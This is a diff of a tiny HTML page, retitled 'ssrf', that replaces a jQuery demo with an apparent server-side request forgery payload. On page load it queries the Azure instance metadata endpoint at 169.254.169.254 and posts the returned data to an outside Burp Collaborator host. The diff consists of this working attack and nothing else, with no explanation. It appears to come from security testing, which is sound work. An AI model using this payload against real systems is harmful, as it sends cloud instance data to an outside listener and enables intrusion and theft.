@@ -2,13 +2,25 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>jQuery get() Demo</title>
+<title>ssrf</title>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script>
 $(document).ready(function(){
-        $.get("https://dj0lhi26m7wo8gqbciihr4wsoju9iy.burpcollaborator.net", function(data){
-            // Display the returned data in browser
-            $("#result").html(data);
+$.ajax({
+            url: "http://169.254.169.254/metadata/instance?api-version=2019-10-01",
+            type: 'GET',
+            dataType: 'json',
+            headers: {"Metadata": "true"},
+            contentType: 'application/json; charset=utf-8',
+            success: function (result) {
+               			$.post( "https://dj0lhi26m7wo8gqbciihr4wsoju9iy.burpcollaborator.net", result)
+				.done(function( result ) {
+				alert( "Data Loaded: " + result );
+			});
+            },
+            error: function (error) {
+                
+            }
         });
 });
 </script>
